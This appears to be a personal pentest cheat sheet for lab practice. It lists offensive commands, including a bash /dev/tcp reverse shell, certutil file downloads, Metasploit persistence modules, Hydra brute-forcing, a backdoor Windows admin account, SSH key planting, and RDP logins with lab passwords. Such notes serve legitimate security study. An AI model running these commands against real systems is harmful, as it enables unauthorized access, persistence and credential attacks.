Tips and Tricks

# Nmap scan (Not for OSCP)
nmap -T4 -p- _IP_
nmap -flags <ports_found> _IP_

rustscan (Not recommended for org)

# File Transfer

For windows
certutil.exe -urlcache -f _link_

For linux
python -m SimpleHTTPServer _port_

FTP:
python -m pyftpdlib 21 (attacker machine)

Linux:
curl,wget

# Maintaining Access

> **scripts**
> * run persistence -h
> * run persistence -X (automatically starts when the system boots)
> * explooit/windows/local/persistence
> * exploit/windows/local/registry_persistence
 
 
> **Scheduled Tasks** (cronjob)
> * run scheduleme
> * run schtaskabuse

> **Add a user**

# Searching exploits

`searchsploit <name>` - gives the findings and this is updated via ghdb.
-|-|-|-|-|-|-|-|-|-|-|-|-|--|-|-|-|-|-|-|-|-|
Tip: If you found any `.rb` file then there is 99% chances that exploit is available in metasploit.

# Execute Code Overflow
If you dont have access to write of create file then try storing it in temp variable.


# List all the avaiable shells

`cat /etc/shells`

# Crontab
`crontab -l` this will list the cron jobs for the current user
`cat /etc/crontab` this will list all the cronjobs available in system

# Netcat reverse shell

`bash -i >& /dev/tcp/[IP]/[PORT] 0>&1`

# Hydra 
**Basic Auth**
`hydra -l bob -P /usr/share/seclists/Passwords/Common-Credentials/best1050.txt -s 80 -f 10.10.156.184 http-get /protected`

[Tips hydra](https://github.com/gnebbia/hydra_notes)

# Nikto
scan with basic auth credentials
`nikto -h ip -id bob:password`

# LFI to steal ssh pvt key

for this always use burp to get the private key 

# Hydra 
**Login page**
`hydra `

# Windows add user
For adding user in windows and then user to admin group use this:
`net user x3rz 123 /add`
`net localgroup Administrators x3rz /add` this will add the x3rz to admin group

# RDP to windows machine
```bash
xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.182.72 /u:Administrator /p:'TryH4ckM3!'
```

Add smb share to windows:
```bash
xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.200.181.150 /u:x3rz /p:'Test@123' /drive:/usr/share/windows-resources,share
```

# SSH keys
`ssh-keygen -f user`
then paste the public key to the authprized_keys section of the target system and then you can login from private key of that user by `ssh -i user user@ip`

# Port forwarding from ssh 
`ssh -L 9001:127.0.0.1:9001 -i user user@ip`

so this will connect my 9001 port to the vitim 

#  Dirsearch
use -   `.old, .bak, .xxx` during searches

